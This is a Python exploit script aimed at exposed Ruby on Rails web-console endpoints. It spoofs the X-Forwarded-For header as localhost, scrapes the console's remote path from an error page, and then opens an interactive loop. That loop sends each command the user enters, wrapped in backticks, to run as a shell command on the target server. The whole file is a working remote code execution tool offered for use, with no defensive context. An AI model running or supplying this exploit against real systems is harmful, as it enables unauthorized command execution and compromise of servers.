#!/usr/bin/python3

import requests
import re

url = input('Enter the target URL: ')
header = {
    'X-Forwarded-For' : '::1'
}
response = requests.get(url + 'non-existing-page', headers=header)
console_remote_path = re.findall("data-remote-path='(.*)'", response.text)[0]

print('Console Remote Path is-')
print(console_remote_path)

url = url + console_remote_path
while True:
	header = {
        'X-Forwarded-For': '::1',
        'Accept': 'application/vnd.web-console.v2',
        'X-Requested-With': 'XMLHttpRequest'
	}
	cmd = input('Enter your command: ')
	if(cmd == 'exit' or cmd == 'quit'):
		break
	elif(cmd == ' '):
		continue

	cmd = '`' + cmd + '`'
	data = {'input': cmd}
	response = requests.put(url, data=data, headers=header)

  
	content = response.text.split('\\n')[0:-2]
	for line in content:
		line = line.strip('\\')
		line = line.split('"', -1)[-1]
		
	print(line)
